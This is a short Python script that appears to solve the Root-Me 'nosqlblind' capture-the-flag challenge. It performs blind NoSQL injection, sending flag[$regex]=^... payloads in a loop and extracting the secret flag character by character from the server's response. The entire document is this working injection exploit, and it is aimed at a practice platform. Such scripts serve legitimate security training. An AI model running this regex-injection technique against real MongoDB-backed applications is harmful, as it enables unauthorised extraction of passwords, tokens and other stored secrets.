import requests
import string

url = 'http://challenge01.root-me.org/web-serveur/ch48/index.php?'

listchar = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@"

flag=''

for i in range(21):
	for c in listchar:
		r = requests.get(url+f'chall_name=nosqlblind&flag[$regex]=^{flag+c}.*')
		if 'Yeah this is the flag for nosqlblind!' in r.text:
			flag+=c
			print("Flag: ",flag)
			break

